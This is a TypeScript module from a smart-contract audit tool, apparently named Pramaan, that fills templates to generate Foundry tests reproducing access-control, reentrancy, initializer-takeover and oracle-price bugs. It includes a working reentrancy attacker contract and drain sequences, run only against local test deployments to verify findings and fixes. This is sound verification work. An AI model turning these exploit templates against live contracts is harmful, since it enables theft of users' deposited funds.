import type { Candidate, ContractFunction, ContractInfo } from "./types.js";

/**
 * Exploit templates. A template is a fixed Foundry test skeleton with a few SLOTS (how to deploy and fund the target,
 * which call the attacker makes). Slots are filled by heuristics, by the project's pramaan.json, or by an AI model;
 * whichever fills them, every slot value must come from the small expression vocabulary below, and the outcome is
 * decided only by running the test on vulnerable and fixed code.
 */
export const TEMPLATE_VERSION = "1";
export type TemplateId = "access-control-drain" | "reentrancy-eth" | "initializer-takeover" | "oracle-unchecked-price";

export const SLOT_EXPRESSION =
  /^(owner|attacker|victim|address\(token\)|address\(feed\)|address\(this\)|SEED|ATTACK|address\(target\)\.balance|\d{1,30}( ether| gwei| wei)?|true|false|""|hex""|bytes32\(0\)|makeAddr\("pramaan\.[a-z0-9_.]{1,40}"\))$/;

export interface TargetConfig {
  deploy?: { kind: "direct" | "proxy"; constructorArgs?: string[]; initializer?: string; initializerArgs?: string[] };
  fund?: { function: string | null; value?: string };
}

export interface ProjectConfig {
  targets?: Record<string, TargetConfig>;
  /** Contract pairs in the same repo: the exploit for `vulnerable` is re-run against `fixed`. */
  pairs?: { vulnerable: string; fixed: string }[];
  /** Source path globs whose candidates are ignored. */
  exclude?: string[];
  /** Test path globs left out of the regression suite (e.g. reference exploits that expect the bug). */
  regression?: { excludePaths?: string[] };
}

export interface ExploitPlan {
  templateId: TemplateId;
  version: string;
  filledBy: "heuristics" | "config" | "ai";
  target: { name: string; source: string };
  deploy: { kind: "direct" | "proxy"; ctorArgs: string[]; initializer: { name: string; args: string[] } | null; /** constructor takes contract-typed parameters: deploy through creationCode + abi.encode (address and contract types share an ABI encoding) */ lowLevelCreate?: boolean };
  fund: { fn: string | null; valueExpr: string };
  attack: { fn: string; args: string[] };
  drain: { fn: string; args: string[] } | null;
  hasOwnerGetter: boolean;
  hypothesis: string;
  property: string;
  preconditions: string[];
}

export type PlanResult = { ok: true; plan: ExploitPlan } | { ok: false; reason: string; needs: string[] };

// --- helpers --------------------------------------------------------------------------------------------------------

export function parseSignature(signature: string): { name: string; types: string[] } {
  const m = signature.match(/^([A-Za-z_$][\w$]*)\((.*)\)$/);
  if (!m) return { name: signature, types: [] };
  return { name: m[1]!, types: m[2]!.trim() ? m[2]!.split(",").map((t) => t.trim()) : [] };
}

function abiType(t: string): string {
  return t.replace(/^contract\s+\S+$/, "address").replace(/^enum\s+\S+$/, "uint8").replace(/\s+payable$/, "").replace(/^address payable$/, "address");
}

export function findFunction(contract: ContractInfo, signature: string): ContractFunction | undefined {
  const { name, types } = parseSignature(signature);
  return contract.functions.find((f) => f.name === name && f.parameters.map((p) => abiType(p.type)).join(",") === types.map(abiType).join(","))
    ?? contract.functions.find((f) => f.name === name);
}

/** Contract functions including inherited ones (ABI is authoritative for what is callable). */
function abiFunctions(contract: ContractInfo) {
  return contract.abi.filter((e) => e.type === "function");
}

function isEntry(f: ContractFunction): boolean {
  return f.kind === "function" && (f.visibility === "public" || f.visibility === "external");
}

function argFor(param: { name: string; type: string }, role: "deploy" | "attack"): string | null {
  const t = abiType(param.type);
  const n = param.name.toLowerCase();
  if (t === "address") {
    if (role === "attack") return "attacker";
    if (/owner|admin|governance|governor|guardian|manager|authority/.test(n)) return "owner";
    if (/oracle|feed|aggregator/.test(n)) return "address(feed)";
    if (/token|asset|underlying|erc20|currency|stable/.test(n) || /^contract /.test(param.type)) return "address(token)";
    return `makeAddr("pramaan.${n.replace(/[^a-z0-9_]/g, "") || "param"}")`;
  }
  if (/^uint\d*$|^int\d*$/.test(t)) return role === "attack" ? "SEED" : "0";
  if (t === "bool") return role === "attack" ? "true" : "false";
  if (t === "string") return '""';
  if (t === "bytes") return 'hex""';
  if (t === "bytes32") return "bytes32(0)";
  return null;
}

function argsFor(params: { name: string; type: string }[], role: "deploy" | "attack"): string[] | null {
  const out: string[] = [];
  for (const p of params) {
    const a = argFor(p, role);
    if (a === null) return null;
    out.push(a);
  }
  return out;
}

function constructorOf(c: ContractInfo): ContractFunction | undefined {
  return c.functions.find((f) => f.kind === "constructor");
}

function initializerOf(c: ContractInfo): ContractFunction | undefined {
  return c.functions.find((f) => isEntry(f) && /^initiali[sz]e$/i.test(f.name)) ?? c.functions.find((f) => isEntry(f) && /^init$/i.test(f.name));
}

function looksUpgradeable(c: ContractInfo): boolean {
  return c.bases.some((b) => /UUPSUpgradeable|Initializable/.test(b));
}

function planDeploy(c: ContractInfo, cfg: TargetConfig | undefined): { ok: true; deploy: ExploitPlan["deploy"]; fromConfig: boolean } | { ok: false; reason: string } {
  if (cfg?.deploy) {
    const d = cfg.deploy;
    const bad = [...(d.constructorArgs ?? []), ...(d.initializerArgs ?? [])].find((a) => !SLOT_EXPRESSION.test(a));
    if (bad) return { ok: false, reason: `pramaan.json argument "${bad}" is not an allowed slot expression` };
    return {
      ok: true,
      fromConfig: true,
      deploy: { kind: d.kind, ctorArgs: d.constructorArgs ?? [], initializer: d.initializer ? { name: d.initializer, args: d.initializerArgs ?? [] } : null },
    };
  }
  const ctor = constructorOf(c);
  const init = initializerOf(c);
  if (looksUpgradeable(c) && init && (!ctor || ctor.parameters.length === 0)) {
    const args = argsFor(init.parameters, "deploy");
    if (!args) return { ok: false, reason: `cannot choose values for ${init.name}(${init.parameters.map((p) => p.type).join(", ")})` };
    return { ok: true, fromConfig: false, deploy: { kind: "proxy", ctorArgs: [], initializer: { name: init.name, args } } };
  }
  const ctorArgs = argsFor(ctor?.parameters ?? [], "deploy");
  if (!ctorArgs) return { ok: false, reason: `cannot choose constructor arguments for ${c.name}` };
  return { ok: true, fromConfig: false, deploy: { kind: "direct", ctorArgs, initializer: null, ...(ctor?.parameters.some((p) => /^contract /.test(p.type)) ? { lowLevelCreate: true } : {}) } };
}

function planFund(c: ContractInfo, cfg: TargetConfig | undefined): { fn: string | null; valueExpr: string } | null {
  if (cfg?.fund) return { fn: cfg.fund.function, valueExpr: cfg.fund.value && SLOT_EXPRESSION.test(cfg.fund.value) ? cfg.fund.value : "SEED" };
  const payable = c.functions.filter((f) => isEntry(f) && f.stateMutability === "payable" && f.parameters.length === 0);
  const deposit = payable.find((f) => /deposit|stake|fund|contribute|supply|mint/i.test(f.name)) ?? payable[0];
  if (deposit) return { fn: deposit.name, valueExpr: "SEED" };
  if (c.functions.some((f) => f.kind === "receive")) return { fn: null, valueExpr: "SEED" };
  return null;
}

function hasOwnerGetter(c: ContractInfo): boolean {
  return abiFunctions(c).some((f) => f.name === "owner" && (f.inputs?.length ?? 0) === 0);
}

function drainFunction(c: ContractInfo, exclude: string): { fn: string; args: string[] } | null {
  const candidates = c.functions.filter(
    (f) => isEntry(f) && f.name !== exclude && f.stateMutability !== "view" && f.stateMutability !== "pure" && /withdraw|sweep|rescue|drain|emergency|recover/i.test(f.name),
  );
  for (const f of candidates.sort((a, b) => a.parameters.length - b.parameters.length)) {
    const args = argsFor(f.parameters, "attack");
    if (args) return { fn: f.name, args: args.map((a) => (a === "SEED" ? "address(target).balance" : a)) };
  }
  return null;
}

// --- templates ------------------------------------------------------------------------------------------------------

export interface PlanInput {
  candidate: Candidate;
  contract: ContractInfo;
  config?: ProjectConfig;
}

export function templateFor(candidate: Candidate): TemplateId | null {
  if (!candidate.function) return null;
  if (candidate.vulnClass === "access-control") return "access-control-drain";
  if (candidate.vulnClass === "reentrancy") return "reentrancy-eth";
  if (candidate.vulnClass === "unprotected-initializer") return "initializer-takeover";
  if (candidate.vulnClass === "unchecked-oracle") return "oracle-unchecked-price";
  return null;
}

export function planExploit(input: PlanInput): PlanResult {
  const { candidate, contract } = input;
  const templateId = templateFor(candidate);
  if (!templateId) return { ok: false, reason: `no exploit template for class "${candidate.vulnClass}"`, needs: [] };
  if (!contract.deployable && contract.kind !== "contract") return { ok: false, reason: `${contract.name} is not deployable`, needs: [] };
  if (contract.abstract) return { ok: false, reason: `${contract.name} is abstract`, needs: [] };
  const fn = findFunction(contract, candidate.function!);
  if (!fn) return { ok: false, reason: `function ${candidate.function} not found in ${contract.name}`, needs: [] };
  const cfg = input.config?.targets?.[contract.name];
  const deploy = planDeploy(contract, cfg);
  if (!deploy.ok) return { ok: false, reason: deploy.reason, needs: ["deploy"] };
  const fund = planFund(contract, cfg);
  const filledBy = deploy.fromConfig || cfg?.fund ? "config" : "heuristics";
  const target = { name: contract.name, source: contract.source };
  const sig = `${fn.name}(${fn.parameters.map((p) => abiType(p.type)).join(",")})`;

  if (templateId === "access-control-drain") {
    if (!fund) return { ok: false, reason: `no payable deposit function or receive() to seed ${contract.name} with ETH`, needs: ["fund"] };
    const args = argsFor(fn.parameters, "attack");
    if (!args) return { ok: false, reason: `cannot choose attacker arguments for ${sig}`, needs: ["attack"] };
    return {
      ok: true,
      plan: {
        templateId, version: TEMPLATE_VERSION, filledBy, target, deploy: deploy.deploy, fund,
        attack: { fn: fn.name, args }, drain: null, hasOwnerGetter: hasOwnerGetter(contract),
        hypothesis: `${contract.name}.${sig} moves the contract's ETH without checking who calls it.`,
        property: "An account with no role must not be able to take ETH that other users deposited.",
        preconditions: [`a victim has deposited SEED (10 ether) via ${fund.fn ?? "receive()"}`, "the attacker holds no role in the contract"],
      },
    };
  }

  if (templateId === "reentrancy-eth") {
    if (!fund || !fund.fn) return { ok: false, reason: `reentrancy template needs a payable deposit function on ${contract.name}`, needs: ["fund"] };
    const amountParams = fn.parameters.filter((p) => /^uint/.test(abiType(p.type)));
    if (fn.parameters.length > 1 || (fn.parameters.length === 1 && amountParams.length !== 1)) {
      return { ok: false, reason: `reentrancy template supports withdraw() or withdraw(uint256), not ${sig}`, needs: ["attack"] };
    }
    return {
      ok: true,
      plan: {
        templateId, version: TEMPLATE_VERSION, filledBy, target, deploy: deploy.deploy, fund,
        attack: { fn: fn.name, args: fn.parameters.length === 1 ? ["ATTACK"] : [] }, drain: null, hasOwnerGetter: hasOwnerGetter(contract),
        hypothesis: `${contract.name}.${sig} sends ETH before updating the caller's balance, so a contract can re-enter it.`,
        property: "No account may withdraw more ETH than it deposited.",
        preconditions: [`a victim has deposited SEED (10 ether) via ${fund.fn}`, "the attacker deposits only ATTACK (1 ether)"],
      },
    };
  }

  if (templateId === "oracle-unchecked-price") {
    const feedInjected = [...deploy.deploy.ctorArgs, ...(deploy.deploy.initializer?.args ?? [])].includes("address(feed)");
    if (!feedInjected) return { ok: false, reason: `${contract.name} does not take its price feed as a constructor or initializer address, so the template cannot substitute a feed`, needs: ["deploy"] };
    if (!fund || !fund.fn) return { ok: false, reason: `oracle template needs a payable deposit function on ${contract.name} (the attacker posts 1 wei of collateral)`, needs: ["fund"] };
    const args = argsFor(fn.parameters, "attack");
    if (!args) return { ok: false, reason: `cannot choose attacker arguments for ${sig}`, needs: ["attack"] };
    return {
      ok: true,
      plan: {
        templateId, version: TEMPLATE_VERSION, filledBy, target, deploy: deploy.deploy, fund,
        attack: { fn: fn.name, args }, drain: null, hasOwnerGetter: hasOwnerGetter(contract),
        hypothesis: `${contract.name}.${sig} uses the price feed's answer without checking that it is positive, so a non-positive answer (cast to uint256) becomes an enormous price.`,
        property: "A feed that returns a non-positive answer must not let an account holding 1 wei of collateral take ETH that other users deposited.",
        preconditions: [`a victim has deposited SEED (10 ether) via ${fund.fn}`, "the attacker holds 1 wei of collateral", "the feed reports an invalid round (answer = -1) after having reported a healthy price"],
      },
    };
  }

  // initializer-takeover
  const args = fn.parameters.map((p) => {
    const a = argFor(p, "deploy");
    return a === "owner" ? "attacker" : a;
  });
  if (args.some((a) => a === null)) return { ok: false, reason: `cannot choose arguments for ${sig}`, needs: ["attack"] };
  const drain = drainFunction(contract, fn.name);
  if (!drain && !hasOwnerGetter(contract)) return { ok: false, reason: "no owner() getter or privileged withdraw function to prove the takeover", needs: ["attack"] };
  const initialized = deploy.deploy.initializer ?? (fn ? { name: fn.name, args: fn.parameters.map((p) => argFor(p, "deploy") ?? "0") } : null);
  return {
    ok: true,
    plan: {
      templateId, version: TEMPLATE_VERSION, filledBy, target,
      deploy: { ...deploy.deploy, initializer: deploy.deploy.kind === "proxy" ? deploy.deploy.initializer : initialized },
      fund: fund ?? { fn: null, valueExpr: "0" },
      attack: { fn: fn.name, args: args as string[] }, drain, hasOwnerGetter: hasOwnerGetter(contract),
      hypothesis: `${contract.name}.${sig} can be called again after deployment and hands its caller privileged roles.`,
      property: "Only the deployer-chosen owner may control the contract after initialization.",
      preconditions: ["the contract was deployed and initialized by its owner", fund ? "a victim has deposited SEED (10 ether)" : "no deposits needed"],
    },
  };
}

// --- rendering ------------------------------------------------------------------------------------------------------

const PROXY_HELPER = `
/// Minimal ERC-1967 proxy used to deploy upgradeable targets (same implementation slot as OpenZeppelin).
contract PramaanProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation, bytes memory data) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }
        if (data.length > 0) {
            (bool ok, bytes memory ret) = implementation.delegatecall(data);
            if (!ok) {
                assembly {
                    revert(add(ret, 32), mload(ret))
                }
            }
        }
    }

    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
`;

const TOKEN_HELPER = `
/// Minimal ERC-20 used when the target needs a token address at deployment.
contract PramaanMockToken {
    string public constant name = "Pramaan Mock Token";
    string public constant symbol = "PMOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
`;

const FEED_HELPER = `
/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker
/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.
contract PramaanMockFeed {
    uint8 public constant decimals = 8;
    int256 public answer;
    uint256 public updatedAt;

    constructor(int256 initialAnswer) {
        answer = initialAnswer;
        updatedAt = block.timestamp;
    }

    function set(int256 newAnswer) external {
        answer = newAnswer;
        updatedAt = block.timestamp;
    }

    function latestAnswer() external view returns (int256) {
        return answer;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, answer, updatedAt, updatedAt, 1);
    }
}
`;

function attackerHelper(plan: ExploitPlan): string {
  const call = `target.${plan.attack.fn}(${plan.attack.args.map((a) => (a === "ATTACK" ? "step" : a)).join(", ")})`;
  return `
/// Re-enters the target from its receive() hook while the target still holds ETH.
contract PramaanReentrancyAttacker {
    PramaanTarget internal immutable target;
    uint256 internal immutable step;
    uint256 public reentries;

    constructor(PramaanTarget target_, uint256 step_) {
        target = target_;
        step = step_;
    }

    function attack() external payable {
        target.${plan.fund.fn}{value: msg.value}();
        ${call};
    }

    receive() external payable {
        if (reentries < 25 && address(target).balance >= step) {
            reentries += 1;
            ${call};
        }
    }
}
`;
}

export interface RenderOptions {
  findingId: string;
  suffix?: string;
}

export function testContractName(findingId: string, suffix = ""): string {
  return `PramaanExploit_${findingId.replace(/[^A-Za-z0-9]/g, "_")}${suffix}`;
}

export function testFileName(findingId: string, suffix = ""): string {
  return `${testContractName(findingId, suffix)}.t.sol`;
}

function call(fn: string, args: string[]): string {
  return `target.${fn}(${args.join(", ")})`;
}

/** Renders the plan as a self-contained Foundry test. Imports only the target (by repo path) and forge-std. */
export function renderExploit(plan: ExploitPlan, opts: RenderOptions): string {
  const usesToken = [...plan.deploy.ctorArgs, ...(plan.deploy.initializer?.args ?? [])].includes("address(token)");
  const name = testContractName(opts.findingId, opts.suffix);
  const setup: string[] = [];
  const usesFeed = plan.templateId === "oracle-unchecked-price" || [...plan.deploy.ctorArgs, ...(plan.deploy.initializer?.args ?? [])].includes("address(feed)");
  if (usesToken) setup.push("token = new PramaanMockToken();");
  if (usesFeed) setup.push("feed = new PramaanMockFeed(2000e8);"); // a healthy ETH/USD-style price
  setup.push("vm.startPrank(owner);");
  if (plan.deploy.kind === "proxy") {
    const init = plan.deploy.initializer;
    const data = init ? `abi.encodeWithSelector(PramaanTarget.${init.name}.selector${init.args.length ? `, ${init.args.join(", ")}` : ""})` : 'hex""';
    setup.push("PramaanTarget implementation = new PramaanTarget();");
    setup.push(`target = PramaanTarget(payable(address(new PramaanProxy(address(implementation), ${data}))));`);
  } else {
    if (plan.deploy.lowLevelCreate) {
      setup.push(`bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(${plan.deploy.ctorArgs.join(", ")}));`);
      setup.push("address pramaanDeployed;");
      setup.push("assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }");
      setup.push('require(pramaanDeployed != address(0), "Pramaan: deployment failed");');
      setup.push("target = PramaanTarget(payable(pramaanDeployed));");
    } else {
      setup.push(`target = new PramaanTarget(${plan.deploy.ctorArgs.join(", ")});`);
    }
    if (plan.deploy.initializer) setup.push(`${call(plan.deploy.initializer.name, plan.deploy.initializer.args)};`);
  }
  setup.push("vm.stopPrank();");
  if (plan.fund.valueExpr !== "0") {
    setup.push(`vm.deal(victim, ${plan.fund.valueExpr});`);
    setup.push("vm.prank(victim);");
    setup.push(
      plan.fund.fn
        ? `target.${plan.fund.fn}{value: ${plan.fund.valueExpr}}();`
        : `(bool funded,) = payable(address(target)).call{value: ${plan.fund.valueExpr}}(""); require(funded, "Pramaan: funding failed");`,
    );
  }

  const attack: string[] = [];
  if (plan.templateId === "access-control-drain") {
    attack.push(
      "uint256 targetBefore = address(target).balance;",
      "uint256 attackerBefore = attacker.balance;",
      "vm.prank(attacker);",
      `${call(plan.attack.fn, plan.attack.args)};`,
      "uint256 gained = attacker.balance - attackerBefore;",
      'emit log_named_uint("pramaan.target_balance_before", targetBefore);',
      'emit log_named_uint("pramaan.attacker_gain", gained);',
      'assertGe(gained, SEED, "Pramaan: an account with no role took ETH other users deposited");',
    );
  } else if (plan.templateId === "reentrancy-eth") {
    attack.push(
      "vm.deal(attacker, ATTACK);",
      "vm.prank(attacker);",
      "PramaanReentrancyAttacker exploit = new PramaanReentrancyAttacker(target, ATTACK);",
      "vm.prank(attacker);",
      "exploit.attack{value: ATTACK}();",
      'emit log_named_uint("pramaan.reentries", exploit.reentries());',
      'emit log_named_uint("pramaan.attacker_contract_balance", address(exploit).balance);',
      // Without a nested call the gain would come from some other bug (e.g. missing access control), not reentrancy.
      'assertGt(exploit.reentries(), 0, "Pramaan: the target was never re-entered");',
      'assertGt(address(exploit).balance, ATTACK, "Pramaan: the attacker withdrew more ETH than it deposited");',
    );
  } else if (plan.templateId === "oracle-unchecked-price") {
    attack.push(
      "vm.deal(attacker, ATTACK);",
      "vm.prank(attacker);",
      `target.${plan.fund.fn}{value: 1}();`, // 1 wei of collateral: enough to be a customer, worthless at a sane price
      "vm.prank(attacker);",
      "feed.set(-1);", // the feed reports an invalid round
      "uint256 attackerBefore = attacker.balance;",
      "vm.prank(attacker);",
      `${call(plan.attack.fn, plan.attack.args)};`,
      "uint256 gained = attacker.balance - attackerBefore;",
      'emit log_named_uint("pramaan.attacker_gain", gained);',
      'assertGe(gained, SEED, "Pramaan: a non-positive oracle answer let an account with 1 wei of collateral take ETH other users deposited");',
    );
  } else {
    attack.push("uint256 attackerBefore = attacker.balance;", "vm.startPrank(attacker);", `${call(plan.attack.fn, plan.attack.args)};`);
    if (plan.drain) attack.push(`${call(plan.drain.fn, plan.drain.args)};`);
    attack.push("vm.stopPrank();");
    if (plan.drain && plan.fund.valueExpr !== "0") {
      attack.push(
        'emit log_named_uint("pramaan.attacker_gain", attacker.balance - attackerBefore);',
        'assertGe(attacker.balance - attackerBefore, SEED, "Pramaan: re-initialising let an outsider take deposited ETH");',
      );
    } else {
      attack.push('assertEq(target.owner(), attacker, "Pramaan: re-initialising made an outsider the owner");');
    }
  }

  const helpers = [plan.deploy.kind === "proxy" ? PROXY_HELPER : "", usesToken ? TOKEN_HELPER : "", usesFeed ? FEED_HELPER : "",plan.templateId === "reentrancy-eth" ? attackerHelper(plan) : ""].join("");
  return `// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding ${opts.findingId}: template ${plan.templateId}@${plan.version}, slots filled by ${plan.filledBy}.
// Hypothesis: ${plan.hypothesis}
// Property under test: ${plan.property}
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {${plan.target.name} as PramaanTarget} from "${plan.target.source}";
${helpers}
contract ${name} is Test {
    PramaanTarget internal target;
${usesToken ? "    PramaanMockToken internal token;\n" : ""}${usesFeed ? "    PramaanMockFeed internal feed;\n" : ""}    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
${setup.map((s) => `        ${s}`).join("\n")}
    }

    function test_exploit() public {
${attack.map((s) => `        ${s}`).join("\n")}
    }
}
`;
}

/** The same plan pointed at a different contract (contract-pair re-verification, e.g. VulnerableVault → VaultV2). */
export function retarget(plan: ExploitPlan, contract: ContractInfo): ExploitPlan {
  return { ...plan, target: { name: contract.name, source: contract.source } };
}
